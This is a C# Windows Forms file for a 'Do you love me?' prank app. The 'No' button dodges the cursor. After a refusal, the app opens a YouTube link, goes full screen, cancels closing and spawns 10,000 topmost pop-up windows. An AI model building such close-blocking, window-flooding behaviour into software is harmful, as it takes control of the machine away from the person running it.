using System;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Security.Policy;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace Do_you_love_me
{
    partial class Form1
    {
        private static Random rand = new Random();
        private void RunCommand(string url)
        {
            Process.Start(new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true,
                });
        }
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }
        private void Yes_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.DialogResult dialog = System.Windows.Forms.MessageBox.Show("I'm gonna love you forever! Do you accept me???", ":)))", System.Windows.Forms.MessageBoxButtons.YesNo, System.Windows.Forms.MessageBoxIcon.Question);
            if (dialog == System.Windows.Forms.DialogResult.Yes)
            {
                System.Windows.Forms.MessageBox.Show("I love you too <3", "Yayyy", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
            }
            else
            {
                var screenWidth = Screen.PrimaryScreen.Bounds.Width;
                var screenHeight = Screen.PrimaryScreen.Bounds.Height;
                System.Windows.Forms.MessageBox.Show("...", "You're dead.", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Information);
                RunCommand("https://www.youtube.com/watch?v=5yor70Px6j4"); // goku..
                this.label1.Hide();
                this.button1.Hide();
                this.button2.Hide();
                this.Width = screenWidth;
                this.Height = screenHeight;
                this.FormClosing += Form1_FormClosing;
            }
        }
        private void Form1_FormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
        {
            e.Cancel = true;
            var tasks = Enumerable.Range(0, 10000) 
                .Select(i => Task.Run(() => SpamMessageBox()))
                .ToArray();

            Task.WhenAll(tasks); 

        }
        private void SpamMessageBox()
        {
            var screenWidth = Screen.PrimaryScreen.Bounds.Width - 100;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height - 100; // small fix
            int x = rand.Next(1, screenWidth - 200);
            int y = rand.Next(1, screenHeight - 100);

            var messageBox = new Form
            {
                StartPosition = FormStartPosition.Manual,
                Location = new Point(x, y),
                Size = new Size(200, 100),
                Text = "GET HERE I WANT TO LOVE YOU!!",
                TopMost = true // Ensure it's always on top
            };

            var label = new Label
            {
                Text = "HOW DARE YOU SENPAI?!?!?!!?",
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleCenter
            };

            messageBox.Controls.Add(label);
            messageBox.Show();
        }
        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.label1.Location = new System.Drawing.Point(93, 56);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(158, 25);
            this.label1.TabIndex = 0;
            this.label1.Text = "Do you love me?";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(32, 237);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(96, 38);
            this.button1.TabIndex = 1;
            this.button1.Text = "Yes";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += Yes_Click;
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(211, 237);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(96, 38);
            this.button2.TabIndex = 2;
            this.button2.Text = "No";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.MouseEnter += Button2_MouseEnter;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(351, 450);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.label1);
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "Do you love me?";
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void Button2_MouseEnter(object sender, System.EventArgs e)
        {
            int x = rand.Next(0, this.Width - 100);
            int y = rand.Next(0, this.Height - 100);
            button2.Location = new System.Drawing.Point(x, y);
        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Button button2;
    }
}

